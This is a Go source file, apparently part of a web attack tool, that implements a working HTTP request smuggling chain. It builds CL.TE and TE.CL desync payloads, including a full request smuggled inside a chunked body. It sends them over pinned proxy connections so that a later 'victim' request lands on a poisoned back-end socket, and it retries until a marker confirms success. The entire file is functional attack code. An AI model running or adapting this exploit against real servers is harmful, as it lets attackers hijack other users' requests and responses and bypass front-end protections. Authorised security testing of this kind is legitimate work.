package probe

import (
	"context"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"

	rawhttp "github.com/projectdiscovery/rawhttp/client"
)

// SmuggleChainProbe verifies a CL.TE desync across connections. It plants the
// "0\r\n\r\nG" prefix with one request and then sends a normal victim request
// on a second connection. A front-end that closes each client connection but
// reuses its back-end socket delivers the desynced response to the victim, and
// the victim request line arrives at the back-end prefixed with "G"
// ("GPOST ...").
//
// The probe never dials. Runner supplies a ConnSource bound to one pinned
// session, so both connections share one proxy and one exit IP.
type SmuggleChainProbe struct {
	// Variant selects the framing disagreement. CL.TE is the original "GPOST"
	// chain; TE.CL plants a complete second request inside a chunked body.
	Variant SmuggleVariant

	// CarrierMethod is the method of the connection-planting request. Empty
	// keeps the historical POST; full-auto sets GET for a read-only carrier.
	CarrierMethod string

	// VictimMethod defaults to POST: with the CL.TE prefix the back-end sees
	// "G"+method, so POST becomes the GPOST marker.
	VictimMethod string
	VictimPath   string
	// VictimHeaders are added to the victim request verbatim.
	VictimHeaders []rawhttp.Header

	// Fields of the request smuggled inside a TE.CL chunk. SmuggledMethod and
	// SmuggledPath default to GET and "/omnislash-<nonce>"; SmuggledHost
	// defaults to the target's Host. SmuggledBody is emitted verbatim.
	SmuggledMethod string
	SmuggledPath   string
	SmuggledHost   string
	SmuggledBody   string

	// SuccessContains is the marker a desynced response must contain. The probe
	// does not guess: without a marker it reports evidence and no verdict.
	SuccessContains string

	// Attempts is how many times the two-request chain is tried. A back-end
	// connection pool may need several tries before the victim lands on the
	// poisoned socket. Default 3.
	Attempts int

	Timeout   time.Duration
	Idle      time.Duration
	MaxHeader int64
	MaxBody   int64
}

func (p *SmuggleChainProbe) Name() string { return "smuggling/cl.te-chain" }

// carrierMethod preserves the historical POST default while allowing the
// full-auto pipeline to plant the prefix with a GET.
func (p *SmuggleChainProbe) carrierMethod() string {
	if m := strings.TrimSpace(p.CarrierMethod); m != "" {
		return m
	}
	return "POST"
}

// Execute cannot run the chain: the technique needs a second connection by
// definition. Runner detects MultiConnProbe and calls ExecuteMulti.
func (p *SmuggleChainProbe) Execute(ctx context.Context, target Target, conn net.Conn) (*Result, error) {
	return nil, fmt.Errorf("%w: use ExecuteMulti", ErrMultiConn)
}

// ExecuteMulti plants the prefix, then sends the victim on a fresh connection.
// Each attempt closes both sockets; the poisoned state lives in the front-end's
// back-end pool, which is exactly what the probe is testing.
func (p *SmuggleChainProbe) ExecuteMulti(ctx context.Context, target Target, source ConnSource) (*Result, error) {
	if target.Addr == "" {
		return nil, fmt.Errorf("probe: target address is required")
	}
	attempts := p.Attempts
	if attempts <= 0 {
		attempts = 3
	}

	variant := p.Variant
	if variant == "" {
		variant = VariantCLTE
	}
	var payload []byte
	var err error
	if variant == VariantTECL {
		payload, err = p.buildTECL(target)
	} else {
		payload, err = (&SmugglingProbe{Variant: variant, Method: p.carrierMethod()}).build(variant, target, "/")
	}
	if err != nil {
		return nil, err
	}
	victim, err := p.renderVictim(target)
	if err != nil {
		return nil, err
	}

	conn, err := source.Dial(ctx)
	if err != nil {
		return nil, fmt.Errorf("probe: dial for payload: %w", err)
	}
	e := newExec(ctx, p.Name(), target, conn, p.Timeout, p.MaxHeader, p.MaxBody)
	// conn is reassigned between the payload and victim stages; a failed dial
	// leaves it nil. Guard the deferred close so the real dial error is returned
	// instead of a nil-pointer panic being recorded as precision loss.
	defer func() {
		if conn != nil {
			_ = conn.Close()
		}
	}()
	idle := orDuration(p.Idle, 2*time.Second)

	for attempt := 1; attempt <= attempts; attempt++ {
		if err := ctx.Err(); err != nil {
			return e.finish(), err
		}
		if attempt > 1 {
			// The previous attempt ended on the victim socket. A new attempt
			// must plant its prefix on a fresh client connection; writing the
			// payload into the victim stream would test nothing and would
			// corrupt any buffered response.
			_ = conn.Close()
			conn, err = source.Dial(ctx)
			if err != nil {
				return e.finish(), fmt.Errorf("probe: dial for payload (attempt %d): %w", attempt, err)
			}
			e.attach(conn)
		}
		if err := e.write(payload); err != nil {
			return e.finish(), fmt.Errorf("probe: payload write (attempt %d): %w", attempt, err)
		}
		probeResp, readErr := e.read()
		if readErr != nil && !isTimeout(readErr) && probeResp == nil {
			return e.finish(), fmt.Errorf("probe: payload read (attempt %d): %w", attempt, readErr)
		}

		// The desync is carried by the front-end's back-end connection, so the
		// victim goes to a new client connection. Close the first socket first:
		// keeping it open would only tie up a slot the front-end already closed.
		_ = conn.Close()
		conn, err = source.Dial(ctx)
		if err != nil {
			return e.finish(), fmt.Errorf("probe: dial for victim (attempt %d): %w", attempt, err)
		}
		e.attach(conn)

		if err := e.write(victim); err != nil {
			return e.finish(), fmt.Errorf("probe: victim write (attempt %d): %w", attempt, err)
		}
		after := e.readUntilIdle(idle)

		if p.SuccessContains != "" {
			// TE.CL often returns the smuggled response to the poison request
			// itself; CL.TE delivers it to the victim socket. Check both.
			for _, r := range append([]*Response{probeResp}, after...) {
				if r != nil && p.markerIn(r) {
					e.addFinding(Finding{
						Kind:       "smuggle_confirmed",
						Confidence: ConfidenceHigh,
						Detail:     fmt.Sprintf("response %d contained %q after a %s chain", r.Seq, p.SuccessContains, variant),
						Response:   r.Seq,
					})
					return e.finish(), nil
				}
			}
		}
	}

	e.addFinding(Finding{
		Kind:       "smuggle_chain_unconfirmed",
		Confidence: ConfidenceLow,
		Detail:     fmt.Sprintf("marker %q did not appear after %d attempts", p.SuccessContains, attempts),
	})
	return e.finish(), nil
}

// buildTECL builds the mirror chain. The front-end honours Transfer-Encoding
// and forwards the whole chunked body. A Content-Length back-end reads only the
// chunk-size line ("87\r\n"), then parses the chunk data as its next request.
// The smuggled request is deliberately short of body bytes so the following
// victim request supplies the rest, as in the classic TE.CL exploit.
func (p *SmuggleChainProbe) buildTECL(target Target) ([]byte, error) {
	method := p.SmuggledMethod
	if method == "" {
		method = "GET"
	}
	path := p.SmuggledPath
	if path == "" {
		path = "/omnislash-" + newNonce()
	}
	host := p.SmuggledHost
	if host == "" {
		host = target.HostHeader()
	}
	body := p.SmuggledBody
	if body == "" {
		body = "x=1"
	}
	smuggled, err := render(requestSpec{
		Method: method,
		Path:   path,
		Headers: []rawhttp.Header{
			{Key: "Host", Value: host},
			{Key: "Content-Type", Value: "application/x-www-form-urlencoded"},
			{Key: "Content-Length", Value: strconv.Itoa(len(body) + 12)},
		},
		Body: []byte(body),
	})
	if err != nil {
		return nil, fmt.Errorf("probe: render smuggled request: %w", err)
	}
	chunk := strconv.FormatInt(int64(len(smuggled)), 16) + "\r\n" + string(smuggled) + "\r\n0\r\n\r\n"
	outer, err := render(requestSpec{
		Method: p.carrierMethod(),
		Path:   target.RequestPath(),
		Headers: []rawhttp.Header{
			{Key: "Host", Value: target.HostHeader()},
			{Key: "User-Agent", Value: "omnislash-probe/1"},
			{Key: "Content-Length", Value: "4"},
			{Key: "Transfer-Encoding", Value: "chunked"},
		},
		Body: []byte(chunk),
	})
	if err != nil {
		return nil, fmt.Errorf("probe: render TE.CL payload: %w", err)
	}
	return outer, nil
}

func (p *SmuggleChainProbe) renderVictim(target Target) ([]byte, error) {
	method := p.VictimMethod
	if method == "" {
		method = "POST"
	}
	path := p.VictimPath
	if path == "" {
		path = target.RequestPath()
	}
	headers := []rawhttp.Header{
		{Key: "Host", Value: target.HostHeader()},
		{Key: "User-Agent", Value: "omnislash-probe/1"},
		{Key: "Content-Length", Value: "0"},
		{Key: "Connection", Value: "keep-alive"},
	}
	headers = append(headers, p.VictimHeaders...)
	return render(requestSpec{Method: method, Path: path, Headers: headers})
}

func (p *SmuggleChainProbe) markerIn(r *Response) bool {
	if r == nil {
		return false
	}
	if strings.Contains(r.Body, p.SuccessContains) || strings.Contains(r.Reason, p.SuccessContains) {
		return true
	}
	for _, h := range r.Headers {
		if strings.Contains(h.Value, p.SuccessContains) {
			return true
		}
	}
	return false
}
